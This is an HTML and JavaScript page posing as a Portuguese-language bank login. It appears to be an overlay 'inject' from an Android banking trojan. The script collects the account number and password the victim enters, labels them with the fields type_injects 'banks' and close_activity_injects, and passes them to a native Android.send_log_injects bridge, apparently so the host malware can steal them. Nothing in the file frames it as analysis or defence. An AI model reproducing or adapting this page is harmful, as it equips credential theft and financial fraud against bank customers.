<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 0.4;
        }

        section {
            flex: 0.6;
            padding: 15px;
        }

        footer {
            padding: 15px;
        }

        label {
            font-weight: 400;
            color: #6c6c6c;
            margin: 0;
        }

        .input {
            width: 100%;
            padding: 10px;
            border: 0;
            border-radius: 6px;
            background-color: #f5f6f9;
            border: 1px solid #f5f6f9;
            font-weight: 600;
            margin-bottom: 15px;
        }

        ::placeholder {
            opacity: 1;
            color: #bdbec2;
        }

        :-moz-placeholder {
            opacity: 1;
            color: #bdbec2;
        }

        ::-moz-placeholder {
            opacity: 1;
            color: #bdbec2;
        }

        :-ms-input-placeholder {
            opacity: 1;
            color: #bdbec2;
        }

        ::-webkit-input-placeholder {
            opacity: 1;
            color: #bdbec2;
        }

        .button {
            width: 100%;
            padding: 10px;
            background-color: #ee8131;
            margin-bottom: 15px;
            color: #fff;
            border: 0;
            border-radius: 8px;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>

        <section>
            <label for="login">Qual a sua conta?</label>
            <input type="tel" class="input" id="login" name="login" placeholder="Digite a conta com o digito" autocomplete="off">

            <label for="password">Senha</label>
            <input type="password" class="input" id="password" name="password" placeholder="" autocomplete="off">

            <input type="submit" class="button" id="sendData" value="Entrar">

            <p style="text-align: center;color: #ee8131;font-weight: 600;">Esqueci minha senha</p>

            
        </section>
        <footer>
            <p style="text-align: center;color: #ee8131;font-weight: 600;"> Precisa de ajuda?</p>
        </footer>
    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(password.value.length < 4) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length >= 4 && password.value.length >= 4) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
